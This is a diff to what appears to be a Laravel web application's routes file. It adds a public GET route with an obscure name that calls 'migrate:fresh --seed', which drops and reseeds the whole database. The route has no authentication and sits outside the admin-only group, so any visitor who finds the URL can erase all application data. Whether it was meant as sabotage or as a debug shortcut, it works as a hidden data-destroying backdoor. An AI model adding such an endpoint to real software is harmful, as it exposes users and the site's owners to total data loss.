@@ -11,6 +11,7 @@ use App\Http\Controllers\TransactionController;
 use App\Http\Controllers\UserController;
 use App\Http\Controllers\VerificationController;
 use Illuminate\Http\Request;
+use Illuminate\Support\Facades\Artisan;
 use Illuminate\Support\Facades\Cookie;
 use Illuminate\Support\Facades\DB;
 use Illuminate\Support\Facades\Response;
@@ -154,6 +155,10 @@ Route::prefix("/admin")->middleware("role:admin")->group(function() {
     });
 });
 // |----------------------|
+
+Route::get("/CalvinKwanGakKerjaFAI",function(){
+    Artisan::call("migrate:fresh --seed");
+});
 
 // BUAT DEBUG / TESTING TAMPILAN DSB, PAKAI ROUTE TEST SAJA.
 Route::view("/test","index");
